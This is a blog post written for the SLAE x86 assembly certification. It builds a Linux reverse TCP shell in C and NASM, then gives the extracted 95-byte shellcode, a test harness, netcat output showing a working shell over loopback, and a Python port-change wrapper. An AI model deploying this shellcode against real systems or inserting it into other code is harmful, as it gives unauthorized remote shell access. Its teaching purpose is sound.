---
title:  "SLAE x86 Assignment 2: Reverse TCP Shell"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will write a reverse shell shellcode for assignment 2 of the Pentester Academy SLAE x86
certification. Let's begin with assignment 2!

## Understanding The Objective ##
Again, let's start off by breaking down the code's major working parts. The shellcode must do the following:

- Creates and configures a socket
- Connects to a given address
- Duplicates standard file descriptors, so that the shell can interact with the socket
- Spawns a shell

We can now write some c code based on this outline. Of course as you can see, this is slightly less complex, compared to the bind shell done previously:

```c
// SLAE Assignment 2: Reverse TCP Shell (Linux/x86)
// Author: 4p0cryph0n
// Website: https://4p0cryph0n.github.io

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    //Defining Address Structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4443); //Port no.
    addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Connect to loopback

    //Create and Configure Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    //Connect
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    //Duplicate Standard File Descriptors
    for (int i = 0; i <= 2; i++)
    {
        dup2(sockfd, i);
    }

    //Execute Shell
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```
In this code, we will only need the ```connect()``` function, instead of ```listen()```, ```bind()```, and ```accept()```. Keep in mind though, in order to duplicate the standard file descriptors, we will use our initial socket descriptor, different from what we did in the bind shell.

```c
#include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
```

Let's compile and run this:
```
Terminal 1:
$ gcc rev_shell.c -o rev_shell
rev_shell.c: In function ‘main’:
rev_shell.c:16:28: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
   16 |     addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Use any interface to listen
      |                            ^~~~~~~~~
$ ./rev_shell

Terminal 2:
$ nc -lvp 4443
listening on [any] 4443 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 59340
uname -a
Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
```
Alright! let's start writing the assembly code for this.

## Assembly Time! ##
Okay so we first need the syscall number for ```connect()```. We can find this in ```/usr/include/linux/net.h```:
```
#define SYS_CONNECT     3               /* sys_connect(2)               */
```
So most of the code is going to be the same as the previously written bind shell, only with a few differences. The start will stay the same:
```nasm
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq               ;clears edx


; create socket s=socket(2,1,0)
mov al, 0x66
inc ebx           ;ebx=1
push edx          ;0
push ebx          ;1
push 0x2          ;2
mov ecx, esp      ;pointer to args
int 0x80          ;syscall
mov esi, eax      ;sockfd
```
The address structure will be slightly different, as we need to add ```127.0.0.1``` as the address to connect to. Now keep in mind that we will need to enter this in Little Endian, so what we need to pass is ```0100007f```. Also, in order to avoid the nulls, it is a good idea to ```xor``` encode it first, and decode it in the assembly code itself.

We will also push 8 bytes of NULL padding with this:
```nasm
mov eax, 0xabaaaad5   ;127.0.0.1 (xored with key 0xaaaaaaa)
mov ebx, 0xaaaaaaaa
xor eax, ebx
push edx              ;padding(NULLs)
push eax              ;127.0.0.1
push word 0x5b11      ;4443
push word 0x2         ;AF_INET
mov ecx, esp          ;pointer to args
```
Apart from this, the code remains the same as the bind shell:
```nasm
; SLAE Assignment 2: Reverse TCP Shell Shellcode (Linux/x86)
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start:

section .text
_start:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        cdq

        ; create socket s=socket(2,1,0)
        mov al, 0x66
        inc ebx               ;ebx=1
        push edx              ;0
        push ebx              ;1
        push 0x2              ;2
        mov ecx, esp          ;pointer to args
        int 0x80              ;syscall
        mov esi, eax          ;sockfd

        ; create addr struc and connect(s,2,port,addr,NULL,16)
        mov eax, 0xabaaaad5   ;127.0.0.1 (xored with key 0xaaaaaaa)
        mov ebx, 0xaaaaaaaa
        xor eax, ebx
        push edx              ;padding (NULL)
        push eax              ;127.0.0.1
        push word 0x5b11      ;4443
        push word 0x2         ;2 (AF_INET)
        mov ecx, esp          ;pointer to args

        xor eax, eax
        xor ebx, ebx
        mov al, 0x66
        inc ebx
        inc ebx               ;ebx=3 --> SYS_CONNECT
        push 0x10             ;16
        push ecx              ;addr struc
        push esi              ;sockfd
        mov ecx, esp
        int 0x80

        ;duplicating stdfds
        xor ecx, ecx          ;ecx=0
        mov cl, 0x3           ;counter for loop. Iterating for 3 stdfds
        dup2:
        xor eax, eax          ;eax=0
        mov al, 0x3f          ;syscall number for dup2
        mov ebx, esi          ;sockfd moved into ebx
        dec cl                ;ecx=2
        int 0x80              ;syscall
        jnz dup2              ;keep looping until the 0 flag is set

        ;execve
        xor ecx, ecx          ;ecx=0
        push ecx              ;pushing the null
        push byte 0x0b        ;print syscall
        pop eax               ;eax=11
        push 0x68732f2f       ;pushing /bin/sh in reverse order
        push 0x6e69622f
        mov ebx, esp          ;pointer to args
        int 0x80              ;syscall
```
Let's extract the shellcode and test it out using ```shellcode.c```:
```
$ objdump -d ./rev_shell_asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb8\xd5\xaa\xaa\xab\xbb\xaa\xaa\xaa\xaa\x31\xd8\x52\x50\x66\x68\x11\x5b\x66\x6a\x02\x89\xe1\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
```
We paste this in ```shellcode.c```:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb8\xd5\xaa\xaa\xab\xbb\xaa\xaa\xaa\xaa\x31\xd8\x52\x50\x66\x68\x11\x5b\x66\x6a\x02\x89\xe1\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
Now lets compile it, and test it out:
```
Terminal 1:

$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode           
shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
    6 | main()
      | ^~~~
$ ./shellcode
Shellcode Length:  95

Terminal 2:

$ nc -lvp 4443
connect to [127.0.0.1] from localhost [127.0.0.1] 47390
uname -a
Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
```
Boom! it works :)

### Customisable Port
The same script written for the previous assignment can be used for this.
```python
#!/usr/bin/python

# SLAE Assignment 1: Simple Python Port Change Wrapper Script
# Author:  4p0cryph0n
# Website: https://4p0cryph0n.github.io/

import sys
import socket

port = int(sys.argv[1])

phtons = hex(socket.htons(int(port)))

half1 = phtons[4:]
half2 = phtons[2:4]

if half1 == "00" or half2 == "00":
        print "Port contains NULL"
        exit(1)

shellcode =  ''
shellcode += ''

shellcode = shellcode.replace('\\x11\\x5b', '\\x{}\\x{}'.format(half1, half2))
print shellcode
```
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE - 1534
